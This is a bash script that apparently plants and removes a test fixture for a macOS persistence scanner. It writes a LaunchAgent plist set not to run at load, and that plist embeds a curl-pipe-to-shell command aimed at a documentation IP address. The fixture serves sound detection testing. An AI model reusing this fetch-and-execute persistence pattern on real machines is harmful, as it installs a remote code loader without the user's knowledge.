#!/usr/bin/env bash
# Plants or cleans up a benign macOS LaunchAgent fixture in ~/Library/LaunchAgents (never loaded/executed).
# Usage: ./scripts/fixtures/plant-macos.sh plant|cleanup
set -euo pipefail

ACTION="${1:-plant}"
PLIST="$HOME/Library/LaunchAgents/com.fcsweep.fixture9876543210.plist"
SCRIPT="/tmp/fcsweep-fixture-agent.sh"

if [ "$ACTION" = "cleanup" ]; then
    rm -f "$PLIST" "$SCRIPT"
    echo "Cleaned up macOS fixture."
    exit 0
fi

cat > "$SCRIPT" <<'SH'
#!/bin/sh
echo "fcsweep benign macos fixture"
SH
chmod +x "$SCRIPT"

mkdir -p "$HOME/Library/LaunchAgents"
cat > "$PLIST" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.fcsweep.fixture9876543210</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>curl -fsSL http://192.0.2.1/fixture.sh | sh</string>
    </array>
    <key>RunAtLoad</key>
    <false/>
</dict>
</plist>
PLIST
echo "Planted macOS fixture plist: $PLIST"
